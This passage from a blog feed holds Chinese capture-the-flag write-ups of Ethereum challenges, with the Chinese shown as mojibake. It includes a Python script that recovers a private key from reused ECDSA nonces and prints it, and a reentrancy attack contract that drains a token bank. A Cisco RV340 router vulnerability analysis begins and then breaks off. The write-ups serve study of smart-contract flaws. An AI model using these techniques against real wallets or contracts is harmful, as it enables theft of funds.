class="number">0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4</span></span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒé“¾æ¥ï¼š</strong></p><p><a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">ç­¾åä¸æ ¡éªŒ :: ä»¥å¤ªåŠæŠ€æœ¯ä¸å®ç° (learnblockchain.cn)</a></p><h3 id="3-Account-Takeover"><a href="#3-Account-Takeover" class="headerlink" title="3. Account Takeover"></a>3. Account Takeover</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>To complete this challenge, send a transaction from theÂ <code>owner</code>â€˜s account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AccountTakeoverChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x6B477781b0e68031109f21887e6B5afEAaEB002b;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=GBkT19uH2RQ">Pinky and The Brain Intro</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬è·å–è´¦æˆ·ç§é’¥</p><p>æ‰¾åˆ°è¯¥è´¦æˆ·çš„æ‰€æœ‰äº¤æ˜“ï¼Œå‘ç°æœ‰ä¸¤ç¬”äº¤æ˜“ä½¿ç”¨äº†åŒæ ·çš„ r</p><p>è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line">infura_url = <span class="string">&#x27;https://ropsten.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.format(a.r.hex()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.format(a.s.hex()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.format(a.v))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.format(a.r.hex()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.format(a.s.hex()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.format(a.v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396</span></span><br><span class="line">s2 = <span class="number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span></span><br><span class="line">z2 = <span class="number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009</span></span><br><span class="line">s1 = <span class="number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span></span><br><span class="line">z1 = <span class="number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span></span><br><span class="line"><span class="comment"># prime order p</span></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"><span class="comment"># based on Fermat&#x27;s Little Theorem</span></span><br><span class="line"><span class="comment"># works only on prime n</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_mod</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pow(a, n - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1-s2,p)%p               <span class="comment">#derivekfors1-s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p     <span class="comment"># derive private key </span></span><br><span class="line">pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p       <span class="comment">#-k(modp)of s1 - s2 == -s1 + s2, check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.format(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.format(-k % p))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.format(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1+s2,p)%p <span class="comment">#derivekfors1+s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p <span class="comment"># derive private key pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p #-k(modp)of s1 + s2 == -s1 - s2, double check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.format(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.format(-k % p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.format(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line">acct =Account.from_key(<span class="string">&quot;614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;account addr &#123;:x&#125;&#x27;</span>.format(acct.address))</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨è¿™ä¸ªè´¦æˆ·è°ƒç”¨ <code>authenticate</code> å‡½æ•°å³å¯ï¼š</p><p><strong>å‚è€ƒé“¾æ¥ï¼š</strong></p><p><a href="https://medium.com/coinmonks/smart-contract-exploits-part-3-featuring-capture-the-ether-accounts-c86d7e9a1400">Smart Contract Exploits Part 3 â€” Featuring Capture the Ether (Accounts) | by Enigmatic | Coinmonks | Medium</a></p><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="1-Assume-ownership"><a href="#1-Assume-ownership" class="headerlink" title="1. Assume ownership"></a>1. Assume ownership</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>To complete this challenge, become theÂ <code>owner</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=ytc4_JJWqMQ">Owner Of A Lonely Heart</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>æ„é€ å‡½æ•°å­˜åœ¨æ‹¼å†™é”™è¯¯ , å¯¼è‡´åˆçº¦éƒ¨ç½²çš„æ—¶å€™è¿™ä¸ªå‡½æ•°æ²¡æœ‰è¿è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssumeOwnershipChallenge</span><br><span class="line">AssumeOwmershipChallenge</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨ <code>AssumeOwmershipChallenge</code> å‡½æ•°è®¾ç½® owner</p><h3 id="2-Token-bank"><a href="#2-Token-bank" class="headerlink" title="2. Token bank"></a>2. Token bank</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It usesÂ <a href="https://github.com/ethereum/EIPs/issues/223">ERC 223</a>Â to accept the incoming tokens.</p><p>The bank deploys a token called â€œSimple ERC223 Tokenâ€ and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    &#x2F;&#x2F; Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply &#x3D; 1000000 * (uint256(10) ** decimals);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] &#x3D; totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            &#x2F;&#x2F;retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length :&#x3D; extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;&#x3D; balanceOf[from]);</span><br><span class="line">        require(value &lt;&#x3D; allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token &#x3D; new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        &#x2F;&#x2F; the token contract&#39;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] &#x3D; 500000 * 10**18;  &#x2F;&#x2F; half for me</span><br><span class="line">        balanceOf[player] &#x3D; 500000 * 10**18;      &#x2F;&#x2F; half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;&#x3D; balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] +&#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=WDbOK_fDu9Y">A British Bank</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬å°† Bank çš„ä½™é¢æ¸…é›¶ã€‚</p><p><code>TokenBankChallenge.withdraw(uint256)</code>Â ä¸­å­˜åœ¨é‡å…¥æ¼æ´ï¼š</p><p>å®ƒå…ˆå‘å‡ºæ¶ˆæ¯è°ƒç”¨Â <code>token.transfer(msg.sender)</code>Â åä¿®æ”¹çŠ¶æ€</p><p>å‰è€…åˆä¼šå‘èµ·å¤–éƒ¨è°ƒç”¨Â <code>ITokenReceiver(to).tokenFallback()</code>ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isContract(to)) &#123;</span><br><span class="line">    ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­äº†toåœ°å€æ˜¯å¦æ˜¯ä¸ªåˆçº¦åœ°å€ï¼Œå¦‚æœæ˜¯åˆçº¦çš„è¯å°±ç”¨<code>ITokenReceiver</code>æ¥å£æ¥è°ƒç”¨<code>to</code>åˆçº¦çš„<code>tokenFallback</code>å‡½æ•°ï¼Œåœ¨é“¶è¡Œåˆçº¦é‡Œè¿™ä¸ªå‡½æ•°ç”¨æ›´æ”¹ç›®æ ‡çš„balanceï¼Œä½†æ˜¯<code>to</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ ï¼Œ æˆ‘ä»¬åªéœ€éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œä¸”è¯¥åˆçº¦ä¹Ÿå­˜åœ¨ <code>tokenFallback</code> å‡½æ•°ï¼Œç„¶åå‡½æ•°ä¸­å†è°ƒç”¨ <code>TokenBankChallenge.withdraw</code> , å°±å¯ä»¥åˆçº¦èº«ä»½æ‰§è¡Œ<code>withdraw</code>å‡½æ•°</p><p>æ­¥éª¤ï¼š</p><ol><li>éƒ¨ç½²æ”»å‡»åˆçº¦</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenBankChallenge &#123;</span><br><span class="line">    function token() external returns (address);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line">interface ISimpleERC223Token &#123;</span><br><span class="line">    function totalSupply() external returns (uint256);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool success); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankSolver &#123;</span><br><span class="line">    ITokenBankChallenge public challenge;</span><br><span class="line">    ISimpleERC223Token public token;</span><br><span class="line">    uint256 public balance &#x3D; 500000000000000000000000;</span><br><span class="line"></span><br><span class="line">    function TokenBankSolver(address _addr) public &#123;</span><br><span class="line">        challenge &#x3D; ITokenBankChallenge(_addr);</span><br><span class="line">        token &#x3D; ISimpleERC223Token(challenge.token());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns(uint256) &#123;</span><br><span class="line">            token.transfer(challenge, balance);</span><br><span class="line">            challenge.withdraw(balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">            token.balanceOf(from); </span><br><span class="line">            require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">            uint256 challengeLeftBalance &#x3D; token.balanceOf(address(challenge));</span><br><span class="line">            bool keepRecursing &#x3D; challengeLeftBalance &gt; 0;</span><br><span class="line">            if (keepRecursing) &#123;</span><br><span class="line">                uint256 v &#x3D; value &lt; challengeLeftBalance? value: challengeLeftBalance;</span><br><span class="line">                challenge.withdraw(v);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns(bool) &#123;</span><br><span class="line">        return challenge.isComplete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>å°† Bankä¸­çš„ balance å…¨éƒ¨ææ¢æˆ Token -&gt; TokenBankChallenge.withdraw =&gt;SimpleERC223Token</p></li><li><p>è®¾ç½® allowance :<code> allowance[from=player][msg.sender=player] =500000000000000000000000</code></p></li><li><p>å°† player çš„ Token å…¨éƒ¨è½¬åˆ°æ”»å‡»åˆçº¦ä¸Šï¼š</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simpleERC223Token_contract.functions.transferFrom(player_account.address,to&#x3D;attack_contract_address,value&#x3D;500000000000000000000000)</span><br></pre></td></tr></table></figure><ol start="5"><li>è°ƒç”¨æ”»å‡»åˆçº¦çš„ attack å‡½æ•°</li></ol><p>è¿™æ ·å°±å®Œæˆäº†æ”»å‡»æ­¥éª¤</p><p>è‡³æ­¤å°±å…¨éƒ¨åšå®Œäº†ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethereum </tag>
            
            <tag> contracts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwning a Cisco RV340  æ¼æ´åˆ†æï¼ˆCVE-2022-20705 å’Œ CVE-2022-20707</title>
      <link href="Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html"/>
      <url>Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>åŸä½œè€…ç”¨åˆ°äº†å››ä¸ªæ¼æ´ï¼Œ æˆ‘è¿™é‡Œç®€å•åˆ†æå…¶ä¸­ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯  CVE-2022-20705 å’Œ CVE-2022-20707</p><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>å½±å“ç‰ˆæœ¬ï¼š RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img</p><p><a href="https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html">Relyze Software Limited - Advanced Software Analysis: Pwning a Cisco RV340 with a 4 bug chain exploit</a></p><h2 id="å›ºä»¶ä¸‹è½½"><a href="#å›ºä»¶ä¸‹è½½" class="headerlink" title="å›ºä»¶ä¸‹è½½"></a>å›ºä»¶ä¸‹è½½</h2><p><a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.26?catid=268437899">Software Download - Cisco Systems</a></p><h2 id="CVE-2022-20705-Improper-Session-Management-Vulnerability"><a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability" class="headerlink" title="CVE-2022-20705 Improper Session Management Vulnerability"></a>CVE-2022-20705 Improper Session Management Vulnerability</h2><p>Nginx é…ç½®ä¸å½“åŠ ä¸Š upload.cgi å¯¹ cookie ä¸¤è€…å¤„ç†ä¸ä¸€è‡´å¯¼è‡´çš„æˆæƒç»•è¿‡ã€‚</p><p>é¦–å…ˆ nginx å¯¹ upload æ¨¡å—çš„ session çš„å¤„ç†å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ cat web.upload.conf</span><br><span class="line">location &#x2F;form-file-upload &#123;</span><br><span class="line">include uwsgi_params;</span><br><span 